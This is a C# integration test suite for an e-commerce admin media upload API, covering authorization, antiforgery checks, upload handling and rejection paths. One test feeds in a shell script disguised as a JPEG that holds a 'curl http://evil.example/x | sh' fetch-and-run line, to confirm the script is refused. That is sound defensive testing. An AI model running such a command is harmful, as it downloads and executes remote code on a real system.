using System.Globalization;
using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using SpencerDenim.Domain.Identity;
using SpencerDenim.Domain.Media;
using SpencerDenim.Infrastructure.Persistence;
using SpencerDenim.IntegrationTests.Infrastructure;
using SpencerDenim.Tests.MediaFixtures;

namespace SpencerDenim.IntegrationTests.Media;

/// <summary>
/// The staff upload endpoints (ADM-18): the permission policy on each one, the antiforgery check, and every
/// rejection path with the status and the machine-readable code it answers with.
/// </summary>
public sealed class AdminMediaEndpointTests(SqlServerDatabaseFixture sqlServer)
{
    private const string ImagesUrl = "/api/admin/media/images";
    private const string VideosUrl = "/api/admin/media/videos";

    // ------------------------------------------------------------- authorization

    [Fact]
    public async Task An_anonymous_upload_is_rejected_before_anything_is_read()
    {
        await using var host = await StartAsync();
        using var client = host.CreateAnonymousClient();
        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(), "a.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task A_staff_user_without_media_create_gets_a_403()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.View);
        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(), "a.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task Deleting_needs_media_delete_not_media_create()
    {
        await using var host = await StartAsync();
        using var uploader = await host.SignInAsync(Permissions.Media.Create);
        var asset = await UploadAsync(uploader, TestImages.UniqueJpeg(400, 300), "deletable.jpg");

        using var response = await uploader.DeleteAsync(
            new Uri($"/api/admin/media/{asset.GetProperty("publicId").GetString()}", UriKind.Relative),
            TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Fact]
    public async Task Reading_an_asset_needs_media_view()
    {
        await using var host = await StartAsync();
        using var uploader = await host.SignInAsync(Permissions.Media.Create);
        var asset = await UploadAsync(uploader, TestImages.UniqueJpeg(400, 300), "readable.jpg");
        var publicId = asset.GetProperty("publicId").GetString();

        using var withoutView = await uploader.GetAsync(
            new Uri($"/api/admin/media/{publicId}", UriKind.Relative),
            TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Forbidden, withoutView.StatusCode);

        using var viewer = await host.SignInAsync(Permissions.Media.View);
        using var withView = await viewer.GetAsync(
            new Uri($"/api/admin/media/{publicId}", UriKind.Relative),
            TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, withView.StatusCode);
    }

    // --------------------------------------------------------------- antiforgery

    [Fact]
    public async Task An_upload_without_an_antiforgery_token_is_refused_with_a_problem_details()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);
        client.DefaultRequestHeaders.Remove(MediaTestHost.AntiforgeryHeader);

        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(), "a.jpg", "image/jpeg");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("invalid_antiforgery_token", await CodeAsync(response));
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task An_upload_with_a_forged_antiforgery_token_is_refused()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);
        client.DefaultRequestHeaders.Remove(MediaTestHost.AntiforgeryHeader);
        client.DefaultRequestHeaders.Add(MediaTestHost.AntiforgeryHeader, "not-a-real-token");

        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(), "a.jpg", "image/jpeg");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("invalid_antiforgery_token", await CodeAsync(response));
    }

    [Fact]
    public async Task A_delete_also_needs_an_antiforgery_token()
    {
        await using var host = await StartAsync();
        using var uploader = await host.SignInAsync(Permissions.Media.Create);
        var asset = await UploadAsync(uploader, TestImages.UniqueJpeg(400, 300), "guarded.jpg");

        using var deleter = await host.SignInAsync(Permissions.Media.Delete);
        deleter.DefaultRequestHeaders.Remove(MediaTestHost.AntiforgeryHeader);

        using var response = await deleter.DeleteAsync(
            new Uri($"/api/admin/media/{asset.GetProperty("publicId").GetString()}", UriKind.Relative),
            TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("invalid_antiforgery_token", await CodeAsync(response));
    }

    // ------------------------------------------------------------- happy paths

    [Fact]
    public async Task An_image_upload_answers_201_with_the_asset_and_its_rendition_urls()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(1800, 2400), "shirt.jpg", "image/jpeg");
        form.Add(new StringContent("A linen shirt on a hanger"), "altText");
        form.Add(new StringContent("Linen shirt"), "title");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);
        Assert.Equal("Ready", body.GetProperty("status").GetString());
        Assert.Equal("Image", body.GetProperty("mediaType").GetString());
        Assert.Equal("A linen shirt on a hanger", body.GetProperty("altText").GetString());
        Assert.Equal("Linen shirt", body.GetProperty("title").GetString());
        Assert.StartsWith("/media/public/originals/", body.GetProperty("url").GetString(), StringComparison.Ordinal);

        var renditions = body.GetProperty("renditionUrls");
        foreach (var rendition in MediaRenditions.Current)
        {
            Assert.StartsWith(
                "/media/public/renditions/",
                renditions.GetProperty(rendition.Code).GetString(),
                StringComparison.Ordinal);
        }

        Assert.NotNull(response.Headers.Location);
    }

    /// <summary>
    /// The second upload of the same bytes is a 200, not a 201: nothing was created, and the admin screen
    /// needs to be able to say "that image is already in the library" rather than quietly showing somebody
    /// else's alt text on what looks like a new asset.
    /// </summary>
    [Fact]
    public async Task Re_uploading_the_same_bytes_answers_200_with_the_asset_that_already_holds_them()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);
        var bytes = TestImages.UniquePng(600, 800);

        var first = await UploadAsync(client, bytes, "swatch.png");

        using var form = MediaTestHost.FilePart("file", bytes, "swatch-again.png", "image/png");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal(first.GetProperty("publicId").GetString(), body.GetProperty("publicId").GetString());
    }

    [Fact]
    public async Task A_video_upload_with_its_poster_answers_201()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestVideos.UniqueMp4(1280, 720, 9.5), "clip.mp4", "video/mp4");
        MediaTestHost.AddFile(form, "poster", TestImages.UniqueJpeg(1280, 720), "poster.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(VideosUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);
        Assert.Equal("Video", body.GetProperty("mediaType").GetString());
        Assert.Equal(9.5m, body.GetProperty("durationSeconds").GetDecimal());
        Assert.NotNull(body.GetProperty("posterUrl").GetString());
    }

    // ------------------------------------------------------------- rejections

    [Fact]
    public async Task A_request_with_no_file_part_is_a_400()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = new MultipartFormDataContent { { new StringContent("hello"), "altText" } };
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("file_missing", await CodeAsync(response));
    }

    [Fact]
    public async Task A_request_that_is_not_multipart_is_a_400()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var content = new StringContent("{}", Encoding.UTF8, "application/json");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), content, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("not_multipart", await CodeAsync(response));
    }

    [Fact]
    public async Task An_empty_file_is_a_400()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", [], "empty.jpg", "image/jpeg");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("empty_file", await CodeAsync(response));
    }

    /// <summary>
    /// The case the whole signature rule exists for: a shell script with a <c>.jpg</c> name and an
    /// <c>image/jpeg</c> content type. Both of those are the client's word; neither is consulted.
    /// </summary>
    [Fact]
    public async Task A_script_dressed_as_a_jpeg_is_a_415_and_the_message_says_renaming_will_not_help()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        var script = Encoding.ASCII.GetBytes("#!/bin/sh\ncurl http://evil.example/x | sh\n");
        using var form = MediaTestHost.FilePart("file", script, "lookbook.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnsupportedMediaType, response.StatusCode);
        Assert.Equal("unsupported_type", body.GetProperty("code").GetString());
        Assert.Contains("script", body.GetProperty("detail").GetString()!, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("renaming", body.GetProperty("detail").GetString()!, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(host.PublicFiles());
    }

    [Theory]
    [InlineData("MZ\u0090")]
    [InlineData("PK\u0003\u0004")]
    [InlineData("<html><body>hi")]
    [InlineData("GIF89a")]
    public async Task Everything_that_is_not_an_accepted_image_is_a_415(string content)
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        var bytes = Encoding.Latin1.GetBytes(content + new string('\0', 64));
        using var form = MediaTestHost.FilePart("file", bytes, "photo.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnsupportedMediaType, response.StatusCode);
        Assert.Equal("unsupported_type", await CodeAsync(response));
    }

    /// <summary>The decompression bomb, end to end: 200 KB in, 6 GB of RGBA declared, refused at the header.</summary>
    [Fact]
    public async Task A_png_declaring_forty_thousand_pixels_square_is_a_422()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestImages.PngDeclaring(40_000, 40_000), "bomb.png", "image/png");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);
        Assert.Equal("unprocessable", body.GetProperty("code").GetString());
        Assert.Contains("megapixels", body.GetProperty("detail").GetString()!, StringComparison.Ordinal);
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task An_image_over_the_configured_ceiling_is_a_413()
    {
        // 4 KB, so the test does not have to push 15 MB through the pipe to prove the rule. The fixture
        // below is comfortably larger, and the assertion checks that as well, so a change to the fixture
        // cannot quietly turn this into a test of nothing.
        await using var host = await StartAsync(new Dictionary<string, string?>(StringComparer.Ordinal)
        {
            ["Media:MaxImageBytes"] = "4096",
        });

        using var client = await host.SignInAsync(Permissions.Media.Create);

        var image = TestImages.UniqueJpeg(2400, 3200);
        Assert.True(image.Length > 4096, $"the fixture is only {image.Length} bytes, so it is not over the ceiling");

        using var form = MediaTestHost.FilePart("file", image, "huge.jpg", "image/jpeg");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.RequestEntityTooLarge, response.StatusCode);
        Assert.Equal("too_large", body.GetProperty("code").GetString());
        Assert.Empty(host.PublicFiles());
    }

    /// <summary>
    /// A body far past the endpoint's ceiling is cut off while it streams, not buffered and then measured.
    /// The client sees the connection refused or a 413; either way nothing reaches storage.
    /// </summary>
    [Fact]
    public async Task A_body_far_past_the_ceiling_is_cut_off_rather_than_buffered()
    {
        await using var host = await StartAsync(new Dictionary<string, string?>(StringComparer.Ordinal)
        {
            ["Media:MaxImageBytes"] = "8192",
            ["Media:MaxVideoBytes"] = "8192",
        });

        using var client = await host.SignInAsync(Permissions.Media.Create);

        // 4 MB against a ~16 KB ceiling.
        using var form = MediaTestHost.FilePart("file", new byte[4 * 1024 * 1024], "huge.bin", "image/jpeg");

        HttpStatusCode? status = null;
        try
        {
            using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
            status = response.StatusCode;
        }
        catch (HttpRequestException)
        {
            // Kestrel closed the connection at the limit, which is the other legitimate answer.
        }

        Assert.True(
            status is null or HttpStatusCode.RequestEntityTooLarge or HttpStatusCode.BadRequest,
            $"unexpected status {status}");

        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task A_video_without_a_poster_is_a_400_that_says_so()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestVideos.Mp4(), "clip.mp4", "video/mp4");
        using var response = await client.PostAsync(new Uri(VideosUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Equal("poster_required", body.GetProperty("code").GetString());
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task A_webm_sent_to_the_video_endpoint_is_a_415()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        var webm = new byte[64];
        new byte[] { 0x1A, 0x45, 0xDF, 0xA3 }.CopyTo(webm, 0);

        using var form = MediaTestHost.FilePart("file", webm, "clip.mp4", "video/mp4");
        MediaTestHost.AddFile(form, "poster", TestImages.UniqueJpeg(320, 240), "poster.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(VideosUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnsupportedMediaType, response.StatusCode);
        Assert.Equal("unsupported_type", await CodeAsync(response));
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task An_hevc_mp4_is_a_422_naming_the_codec()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestVideos.Mp4(codec: "hvc1"), "clip.mp4", "video/mp4");
        MediaTestHost.AddFile(form, "poster", TestImages.UniqueJpeg(320, 240), "poster.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(VideosUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);
        Assert.Contains("H.264", body.GetProperty("detail").GetString()!, StringComparison.Ordinal);
        Assert.Empty(host.PublicFiles());
    }

    [Fact]
    public async Task A_video_whose_poster_is_not_an_image_is_refused_and_says_which_part_was_wrong()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Create);

        using var form = MediaTestHost.FilePart("file", TestVideos.Mp4(), "clip.mp4", "video/mp4");
        MediaTestHost.AddFile(form, "poster", Encoding.ASCII.GetBytes("<html>"), "poster.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(VideosUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.UnsupportedMediaType, response.StatusCode);
        Assert.Contains("poster", body.GetProperty("detail").GetString()!, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(host.PublicFiles());
    }

    /// <summary>
    /// With no volumes configured the API still starts — a developer working on the catalogue should not
    /// have to set up storage — and says so with a 503 rather than a stack trace.
    /// </summary>
    [Fact]
    public async Task With_no_media_volumes_configured_an_upload_is_a_503_that_names_the_settings()
    {
        sqlServer.SkipIfUnavailable();
        await TestDatabaseMigrator.MigrateAsync(sqlServer.ConnectionString, TestContext.Current.CancellationToken);

        // No Media:PublicRoot / Media:PrivateRoot anywhere: the plain factory, as a deployment that has
        // not set them up would be.
        await using var factory = new ApiFactory(sqlServer.ConnectionString);

        using var client = await MediaTestHost.SignInAsync(factory, Permissions.Media.Create);
        using var form = MediaTestHost.FilePart("file", TestImages.UniqueJpeg(), "a.jpg", "image/jpeg");

        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.ServiceUnavailable, response.StatusCode);
        Assert.Equal("storage_not_configured", body.GetProperty("code").GetString());
        Assert.Contains("Media__PublicRoot", body.GetProperty("detail").GetString()!, StringComparison.Ordinal);
    }

    // ------------------------------------------------------------- delete guard

    [Fact]
    public async Task Deleting_an_unused_asset_answers_204_and_then_404()
    {
        await using var host = await StartAsync();
        using var uploader = await host.SignInAsync(Permissions.Media.Create);
        var asset = await UploadAsync(uploader, TestImages.UniqueJpeg(400, 300), "throwaway.jpg");
        var url = new Uri($"/api/admin/media/{asset.GetProperty("publicId").GetString()}", UriKind.Relative);

        using var deleter = await host.SignInAsync(Permissions.Media.Delete);

        using var first = await deleter.DeleteAsync(url, TestContext.Current.CancellationToken);
        Assert.Equal(HttpStatusCode.NoContent, first.StatusCode);

        using var second = await deleter.DeleteAsync(url, TestContext.Current.CancellationToken);
        Assert.Equal(HttpStatusCode.NotFound, second.StatusCode);
        Assert.Equal("not_found", await CodeAsync(second));
    }

    [Fact]
    public async Task Deleting_an_asset_a_product_uses_is_a_409_carrying_the_usage_list()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.Delete, Permissions.Media.View);

        var publicId = await FirstSeededProductImageAsync(host);

        using var response = await client.DeleteAsync(
            new Uri($"/api/admin/media/{publicId}", UriKind.Relative),
            TestContext.Current.CancellationToken);

        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Conflict, response.StatusCode);
        Assert.Equal("in_use", body.GetProperty("code").GetString());

        var usages = body.GetProperty("usages");
        Assert.True(usages.GetArrayLength() > 0);
        Assert.Equal("Product", usages[0].GetProperty("ownerType").GetString());
        Assert.False(string.IsNullOrWhiteSpace(usages[0].GetProperty("ownerLabel").GetString()));
    }

    [Fact]
    public async Task The_usages_endpoint_answers_the_same_list_and_404s_for_an_unknown_asset()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Media.View);
        var publicId = await FirstSeededProductImageAsync(host);

        using var found = await client.GetAsync(
            new Uri($"/api/admin/media/{publicId}/usages", UriKind.Relative),
            TestContext.Current.CancellationToken);

        var usages = await found.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, found.StatusCode);
        Assert.True(usages.GetArrayLength() > 0);

        using var missing = await client.GetAsync(
            new Uri($"/api/admin/media/{Guid.NewGuid()}/usages", UriKind.Relative),
            TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.NotFound, missing.StatusCode);
    }

    // ---------------------------------------------------------------- helpers

    private async Task<MediaTestHost> StartAsync(IReadOnlyDictionary<string, string?>? configure = null)
    {
        sqlServer.SkipIfUnavailable();
        await TestDatabaseMigrator.MigrateAsync(sqlServer.ConnectionString, TestContext.Current.CancellationToken);
        return MediaTestHost.Create(sqlServer.ConnectionString, configure);
    }

    private static async Task<JsonElement> UploadAsync(HttpClient client, byte[] bytes, string fileName)
    {
        using var form = MediaTestHost.FilePart("file", bytes, fileName, "application/octet-stream");
        using var response = await client.PostAsync(new Uri(ImagesUrl, UriKind.Relative), form, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);
        return await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);
    }

    private static async Task<string> FirstSeededProductImageAsync(MediaTestHost host)
    {
        await using var scope = host.Factory.Services.CreateAsyncScope();
        var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();

        var usage = await dbContext.MediaUsages
            .AsNoTracking()
            .Where(candidate => candidate.OwnerType == MediaUsageOwnerTypes.Product)
            .OrderBy(candidate => candidate.Id)
            .FirstAsync(TestContext.Current.CancellationToken);

        var asset = await dbContext.MediaAssets
            .AsNoTracking()
            .SingleAsync(candidate => candidate.Id == usage.MediaAssetId, TestContext.Current.CancellationToken);

        return asset.PublicId.ToString("D", CultureInfo.InvariantCulture);
    }

    private static async Task<string?> CodeAsync(HttpResponseMessage response)
    {
        var body = await response.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken);
        return body.TryGetProperty("code", out var code) ? code.GetString() : null;
    }

}
